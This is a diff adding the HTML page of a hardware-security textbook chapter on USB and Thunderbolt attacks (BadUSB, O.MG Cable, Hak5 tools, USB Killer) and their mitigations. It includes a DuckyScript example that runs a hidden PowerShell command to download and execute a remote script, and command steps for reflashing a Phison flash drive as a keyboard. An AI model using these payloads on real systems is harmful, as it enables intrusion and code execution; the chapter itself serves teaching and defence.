+  <a href="#3581-pcileech-hardware-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8.1 PCILeech Hardware Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3582-pcileech-software" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8.2 PCILeech Software
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-kernel-dma" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9 Kernel DMA Protection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.9 Kernel DMA Protection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3591-intel-vt-d-iommu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9.1 Intel VT-d IOMMU
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3592-thunderbolt-4-mandatory-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9.2 Thunderbolt 4 Mandatory Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10 USB Policy Enforcement
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.10 USB Policy Enforcement">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#35101-linux-usbguard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10.1 Linux USBGuard
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35102-windows-usb-restrictions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10.2 Windows USB Restrictions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.11 USB 3.2 and USB4 Security Improvements
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-pd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.12 USB Power Delivery Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.13 FPGA Implementation for USB Protocol Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.14 ASIC Implementation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.15 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.16 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.17 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch35-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.18 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#35181-usb4-version-20-80-gbps-and-updated-security-model-2022-devices-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.1 USB4 Version 2.0 — 80 Gbps and Updated Security Model (2022, Devices 2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35182-choicejacking-usb-charger-mitm-attack-on-mobile-devices-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.2 ChoiceJacking — USB Charger MITM Attack on Mobile Devices (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35183-thunderbolt-5-intel-barlow-ridge-2023-120-gbps-and-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.3 Thunderbolt 5 (Intel Barlow Ridge, 2023) — 120 Gbps and Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35184-cve-2023-28746-rdfs-microarchitectural-data-sampling-via-usb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.4 CVE-2023-28746 — RDFS Microarchitectural Data Sampling via USB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35185-badusb-c-updated-attacks-on-usb-c-controllers-2023" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.5 BadUSB-C — Updated Attacks on USB-C Controllers (2023)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35186-usb-implementers-forum-security-working-group-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.6 USB Implementers Forum Security Working Group (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.19 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch36-wireless-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    36. Wireless Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch37-confidential-computing-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    37. Confidential Computing Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch38-hardware-security-design-flow-and-eda-tools.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    38. Hardware Security Design Flow and EDA Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch39-chiplet-and-heterogeneous-integration-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    39. Chiplet and Heterogeneous Integration Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="key-standards-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Key Standards Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="security-tools-reference.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Tools Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="further-reading.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Further Reading
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-taxonomy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.1 USB Attack Taxonomy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-hw-arch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.2 USB Hardware Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.2 USB Hardware Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3521-xhci-host-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.2.1 xHCI Host Controller
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-badusb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3 BadUSB Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.3 BadUSB Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3531-phison-ps2251-firmware-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3.1 Phison PS2251 Firmware Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3532-usb-class-spoofing-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3.2 USB Class Spoofing Mechanism
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-omg-cable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.4 O.MG Cable and Advanced Hardware Implants
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-hak5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.5 Hak5 Ecosystem
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-killer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.6 USB Killer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-thunderspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.7 Thunderspy – Thunderbolt Security Vulnerabilities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.7 Thunderspy – Thunderbolt Security Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3571-thunderspy-attack-procedure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.7.1 Thunderspy Attack Procedure
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-pcileech" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8 PCILeech DMA Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.8 PCILeech DMA Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3581-pcileech-hardware-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8.1 PCILeech Hardware Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3582-pcileech-software" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8.2 PCILeech Software
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-kernel-dma" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9 Kernel DMA Protection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.9 Kernel DMA Protection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3591-intel-vt-d-iommu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9.1 Intel VT-d IOMMU
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3592-thunderbolt-4-mandatory-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.9.2 Thunderbolt 4 Mandatory Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10 USB Policy Enforcement
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.10 USB Policy Enforcement">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#35101-linux-usbguard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10.1 Linux USBGuard
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35102-windows-usb-restrictions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.10.2 Windows USB Restrictions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.11 USB 3.2 and USB4 Security Improvements
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-pd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.12 USB Power Delivery Security
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-fpga" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.13 FPGA Implementation for USB Protocol Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-asic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.14 ASIC Implementation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-solutions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.15 Commercial and Open-Source Solutions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-solved" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.16 Solved Problems
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-standards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.17 Standards
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ch35-recent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18 Recent Developments (2024–2026)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.18 Recent Developments (2024–2026)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#35181-usb4-version-20-80-gbps-and-updated-security-model-2022-devices-20232024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.1 USB4 Version 2.0 — 80 Gbps and Updated Security Model (2022, Devices 2023–2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35182-choicejacking-usb-charger-mitm-attack-on-mobile-devices-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.2 ChoiceJacking — USB Charger MITM Attack on Mobile Devices (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35183-thunderbolt-5-intel-barlow-ridge-2023-120-gbps-and-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.3 Thunderbolt 5 (Intel Barlow Ridge, 2023) — 120 Gbps and Security
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35184-cve-2023-28746-rdfs-microarchitectural-data-sampling-via-usb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.4 CVE-2023-28746 — RDFS Microarchitectural Data Sampling via USB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35185-badusb-c-updated-attacks-on-usb-c-controllers-2023" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.5 BadUSB-C — Updated Attacks on USB-C Controllers (2023)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35186-usb-implementers-forum-security-working-group-2024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.18.6 USB Implementers Forum Security Working Group (2024)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-exercises" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.19 Exercises
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ch-usb-thunderbolt-security">Chapter 35: USB and Thunderbolt Security<a class="headerlink" href="#ch-usb-thunderbolt-security" title="Permanent link">&para;</a></h1>
+<p>USB is the world’s most ubiquitous peripheral interface, present in virtually every computing device. This ubiquity, combined with a protocol architecture that was designed for functionality rather than security, makes USB an attractive attack surface for adversaries ranging from pentesting professionals to nation-state actors. Thunderbolt 3/4’s PCIe Direct Memory Access (DMA) capability elevates the risk further, enabling an attacker with physical access to read and write arbitrary system memory within seconds. This chapter covers the hardware architectures, attack tools, historical exploits, and hardware defences for USB and Thunderbolt security.</p>
+<h2 id="sec-usb-taxonomy"><span class="secnum">35.1</span> USB Attack Taxonomy<a class="headerlink" href="#sec-usb-taxonomy" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-usb-taxonomy">
+<div class="tbl-caption"><strong>Table 35.1.</strong> USB and Thunderbolt attack taxonomy with hardware and software context.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Attack</strong></th>
+<th style="text-align: left;"><strong>Hardware</strong></th>
+<th style="text-align: left;"><strong>Mechanism</strong></th>
+<th style="text-align: left;"><strong>Mitigation</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">BadUSB</td>
+<td style="text-align: left;">Phison PS2251 MCU</td>
+<td style="text-align: left;">HID firmware spoof</td>
+<td style="text-align: left;">USB-IF Auth, USBGuard whitelist</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB Drop</td>
+<td style="text-align: left;">Any USB device</td>
+<td style="text-align: left;">User curiosity</td>
+<td style="text-align: left;">Policy + endpoint DLP</td>
+</tr>
+<tr>
+<td style="text-align: left;">Juice Jacking</td>
+<td style="text-align: left;">Malicious charger</td>
+<td style="text-align: left;">Data over VBUS</td>
+<td style="text-align: left;">USB condom / data-blocking cable</td>
+</tr>
+<tr>
+<td style="text-align: left;">HID Keylogger</td>
+<td style="text-align: left;">Custom ASIC</td>
+<td style="text-align: left;">Keystroke injection</td>
+<td style="text-align: left;">No-new-HID policy, USBGuard</td>
+</tr>
+<tr>
+<td style="text-align: left;">O.MG Cable</td>
+<td style="text-align: left;">ESP8266 in cable</td>
+<td style="text-align: left;">WiFi HID injection</td>
+<td style="text-align: left;">RF detection, cable inspection</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB Killer</td>
+<td style="text-align: left;">200 V cap. surge</td>
+<td style="text-align: left;">Power line damage</td>
+<td style="text-align: left;">Surge-protected port, poly-fuse</td>
+</tr>
+<tr>
+<td style="text-align: left;">Thunderspy DMA</td>
+<td style="text-align: left;">SPI programmer</td>
+<td style="text-align: left;">PCIe DMA bypass</td>
+<td style="text-align: left;">Kernel DMA Protection mandatory</td>
+</tr>
+<tr>
+<td style="text-align: left;">PCILeech DMA</td>
+<td style="text-align: left;">FPGA board</td>
+<td style="text-align: left;">Read/write RAM via PCIe</td>
+<td style="text-align: left;">Intel VT-d IOMMU enabled</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB PD Attack</td>
+<td style="text-align: left;">Malicious charger</td>
+<td style="text-align: left;">Uncontrolled charging</td>
+<td style="text-align: left;">PD policy enforcement in EC</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-usb-hw-arch"><span class="secnum">35.2</span> USB Hardware Architecture<a class="headerlink" href="#sec-usb-hw-arch" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-usb-stack">
+<img class="tikz" src="img/tikz-c9f884cf8620.svg" alt="USB protocol stack: host-side layers (top to bottom) communicate with the device-side controller. BadUSB reprograms the device-side firmware to impersonate a different USB class (e.g., HID keyboard)…" loading="lazy">
+<figcaption><strong>Figure 35.1.</strong> USB protocol stack: host-side layers (top to bottom) communicate with the device-side controller. BadUSB reprograms the device-side firmware to impersonate a different USB class (e.g., HID keyboard) while appearing as a storage device.</figcaption>
+</figure>
+
+<h3 id="3521-xhci-host-controller"><span class="secnum">35.2.1</span> xHCI Host Controller<a class="headerlink" href="#3521-xhci-host-controller" title="Permanent link">&para;</a></h3>
+<p>The Extensible Host Controller Interface (xHCI, USB 3.x specification) manages all USB speeds: SuperSpeed+ (USB 3.2 Gen 2x2: 20 Gbps), SuperSpeed (USB 3.2 Gen 1: 5 Gbps), Hi-Speed (USB 2.0: 480 Mbps), and Full-Speed (12 Mbps).</p>
+<p>xHCI registers:</p>
+<div class="language-text highlight"><pre><span></span><code># xHCI register map (PCI BAR0, memory-mapped)
+0x000  CAPLENGTH    1B  Capability registers length
+0x002  HCIVERSION   2B  xHCI spec version (e.g., 0x0110 = v1.1)
+0x004  HCSPARAMS1   4B  Max slots, interrupts, ports
+0x008  HCSPARAMS2   4B  Isochronous scheduling threshold
+0x010  HCCPARAMS1   4B  Capabilities (64-bit address, etc.)
+0x018  DBOFF        4B  Doorbell array offset
+0x01C  RTSOFF       4B  Runtime register space offset
+# Operational registers (base + CAPLENGTH)
+0x020  USBCMD       4B  Run/Stop, Reset, EWE
+0x024  USBSTS       4B  HCH, CNR, PCD, etc.
+</code></pre></div>
+<p>USB hub topology: USB supports up to 7 tiers of hubs, maximum 127 devices per host controller. Each tier adds <span class="arithmatex">\(\leq 5\)</span> ns propagation delay; total allowed: 1500 ns (USB 2.0).</p>
+<h2 id="sec-badusb"><span class="secnum">35.3</span> BadUSB Attack<a class="headerlink" href="#sec-badusb" title="Permanent link">&para;</a></h2>
+<h3 id="3531-phison-ps2251-firmware-exploitation"><span class="secnum">35.3.1</span> Phison PS2251 Firmware Exploitation<a class="headerlink" href="#3531-phison-ps2251-firmware-exploitation" title="Permanent link">&para;</a></h3>
+<p>BadUSB (Karsten Nohl, Jakob Lell, USENIX Security 2014): USB mass storage controller firmware can be extracted and modified to present additional USB interfaces (HID keyboard, RNDIS Ethernet, CDC-ACM serial) via the Device Firmware Upgrade (DFU) mode.</p>
+<p>Phison PS2251-03: 8051-compatible microcontroller, 64 KB ROM (boot code), 64 KB SRAM, USB 2.0 Hi-Speed controller, NAND flash interface (ONFi 1.0). The 8051 instruction set is well-understood; ROM can be patched by loading a replacement firmware image via the DFU endpoint.</p>
+<p>Affected controllers:</p>
+<ul>
+<li>
+<p>PS2251-03: Phison, 8051 core, US Patriot / Kingston Datatraveler OEM</p>
+</li>
+<li>
+<p>PS2251-07: Updated variant, same 8051 core, different NAND interface</p>
+</li>
+<li>
+<p>PS2251-09: USB 3.0 variant, still 8051-compatible boot loader</p>
+</li>
+<li>
+<p>PS2303: Phison, used in SanDisk Cruzer series (partially vulnerable)</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># PhisonBurner workflow (research tool, Haifux Club adaptation)
+# Step 1: Put device in DFU mode (unplug, hold button, replug)
+$ lsusb | grep "0d7d:1700"   # Phison DFU mode VID:PID
+
+# Step 2: Extract current firmware
+$ phisonburner -r firmware_backup.bin
+
+# Step 3: Patch firmware image (add HID descriptor)
+# Add HID Report Descriptor to USB configuration descriptor set
+# Change bNumConfigurations = 2 (MSC + HID)
+
+# Step 4: Flash modified firmware
+$ phisonburner -w patched_firmware.bin
+
+# Result: USB device now appears as both Mass Storage AND HID keyboard
+</code></pre></div>
+<h3 id="3532-usb-class-spoofing-mechanism"><span class="secnum">35.3.2</span> USB Class Spoofing Mechanism<a class="headerlink" href="#3532-usb-class-spoofing-mechanism" title="Permanent link">&para;</a></h3>
+<p>A USB device presents its identity to the host via USB descriptors: Device Descriptor (bDeviceClass), Configuration Descriptor, Interface Descriptors, and Endpoint Descriptors. A reprogrammed controller can present multiple Interface Descriptors – one for MSC (Mass Storage Class, bInterfaceClass=0x08) and one for HID (Human Interface Device, bInterfaceClass=0x03) – simultaneously. The OS enumerates both and loads both class drivers, granting the device keyboard privileges while the user only sees a USB drive.</p>
+<h2 id="sec-omg-cable"><span class="secnum">35.4</span> O.MG Cable and Advanced Hardware Implants<a class="headerlink" href="#sec-omg-cable" title="Permanent link">&para;</a></h2>
+<p>The O.MG Cable (MG, released 2019, sold at Hak5): a Lightning or USB-C cable with an embedded ESP8266 WiFi module, ARM Cortex-M0 microcontroller, and 4 MB flash, all fitted within the USB connector housing (<span class="arithmatex">\(\approx 26\)</span> mm<span class="arithmatex">\(^3\)</span> volume).</p>
+<ul>
+<li>
+<p>WiFi: 2.4 GHz IEEE 802.11b/g/n, creates a hidden SSID or joins existing network</p>
+</li>
+<li>
+<p>Attack delivery: DuckyScript payloads pushed via HTTP API over WiFi from attacker’s phone</p>
+</li>
+<li>
+<p>Range: up to 300 metres in open space; reduced inside office buildings (typically 30–50 m)</p>
+</li>
+<li>
+<p>USB-C variant (O.MG Cable USB-C): 24-pin connector, same internals</p>
+</li>
+<li>
+<p>O.MG Elite (2022): adds data interception (MitM on data lines in addition to HID)</p>
+</li>
+<li>
+<p>Detection: RF spectrum scan (2.4 GHz unexpected beacon from USB device), X-ray imaging of cable, USB protocol analyser showing enumeration anomalies</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># DuckyScript payload (legitimate pentesting with authorisation)
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')"
+ENTER
+</code></pre></div>
+<h2 id="sec-hak5"><span class="secnum">35.5</span> Hak5 Ecosystem<a class="headerlink" href="#sec-hak5" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-hak5">
+<div class="tbl-caption"><strong>Table 35.2.</strong> Hak5 hardware pentesting product line (retail prices as of 2024).</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Product</strong></th>
+<th style="text-align: left;"><strong>Price</strong></th>
+<th style="text-align: left;"><strong>Hardware</strong></th>
+<th style="text-align: left;"><strong>Primary Attack Vector</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">USB Rubber Ducky (Gen 2)</td>
+<td style="text-align: left;">$80</td>
+<td style="text-align: left;">ARM Cortex-M0, SD card</td>
+<td style="text-align: left;">HID keystroke injection</td>
+</tr>
+<tr>
+<td style="text-align: left;">Bash Bunny Mark II</td>
+<td style="text-align: left;">$120</td>
+<td style="text-align: left;">Cortex-A9, 8 GB storage</td>
+<td style="text-align: left;">HID + MSC + Ethernet combo</td>
+</tr>
+<tr>
+<td style="text-align: left;">O.MG Cable</td>
+<td style="text-align: left;">$180</td>
+<td style="text-align: left;">ESP8266 + Cortex-M0 in cable</td>
+<td style="text-align: left;">WiFi HID injection</td>
+</tr>
+<tr>
+<td style="text-align: left;">Packet Squirrel</td>
+<td style="text-align: left;">$60</td>
+<td style="text-align: left;">MIPS, OpenWrt</td>
+<td style="text-align: left;">Network tap, DNS spoof</td>
+</tr>
+<tr>
+<td style="text-align: left;">LAN Turtle</td>
+<td style="text-align: left;">$65</td>
+<td style="text-align: left;">MIPS, OpenWrt, USB Ethernet</td>
+<td style="text-align: left;">Network backdoor</td>
+</tr>
+<tr>
+<td style="text-align: left;">WiFi Coconut</td>
+<td style="text-align: left;">$100</td>
+<td style="text-align: left;">14x USB WiFi 802.11n</td>
+<td style="text-align: left;">Full-band 2.4 GHz capture</td>
+</tr>
+<tr>
+<td style="text-align: left;">Screen Crab</td>
+<td style="text-align: left;">$130</td>
+<td style="text-align: left;">Cortex-A7, HDMI capture</td>
+<td style="text-align: left;">Screen capture MitM</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-usb-killer"><span class="secnum">35.6</span> USB Killer<a class="headerlink" href="#sec-usb-killer" title="Permanent link">&para;</a></h2>
+<p>USB Killer v3 (2016, USBKill.com): a USB-A / USB-C device containing a charge pump and a bank of 220 <span class="arithmatex">\(\mu\)</span>F capacitors charged to <span class="arithmatex">\(\pm 200\)</span> V via the VBUS line (5 V input). When the switch fires, 200 V is applied to the USB data lines D+ and D-, destroying the host’s USB controller, ESD protection diodes, and often the SoC.</p>
+<p>Charge pump circuit: a flyback converter operating at 1–5 MHz using an off-the-shelf MC34063A or similar PWM controller, achieving voltage multiplication from 5 V to 200 V. Discharge energy: <span class="arithmatex">\(E = \frac{1}{2}CV^2 = \frac{1}{2} \times 220 \times 10^{-6} \times 200^2 = 4.4\)</span> J per discharge cycle (approximately 80 discharges per minute).</p>
